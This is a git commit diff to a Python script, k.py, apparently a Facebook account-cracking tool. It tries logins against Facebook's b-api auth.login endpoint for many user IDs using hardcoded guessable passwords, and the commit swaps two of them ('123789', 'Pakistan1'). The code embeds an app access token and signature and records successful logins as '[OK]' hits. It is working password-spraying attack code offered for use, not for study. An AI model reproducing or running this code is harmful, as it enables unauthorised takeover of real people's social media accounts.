7c23d057eda45a184bc99b29d6fe63326746ccd2
Tahir520 <36207064+Tahir520@users.noreply.github.com>
2020-03-29 22:58:36 +0500

    Update k.py

--- k.py
+++ k.py
@@ -277,7 +277,7 @@ def pb():
 		try:
 			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)
 			j=json.loads(h.text)
-			ps1=('786786')
+			ps1=('123789')
 			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			k=json.load(dt)
 			if 'www.facebook.com' in k['error_msg']:
@@ -321,7 +321,7 @@ def pb():
 			                                print(G+'[OK] ♡ '+user+' ♡ '+ps4)
 			                                oks.append(user+ps4)
 			                            else:
-			                                ps5=('Pakistan')
+			                                ps5=('Pakistan1')
 			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                                k=json.load(dt)
 			                                if 'www.facebook.com' in k['error_msg']:
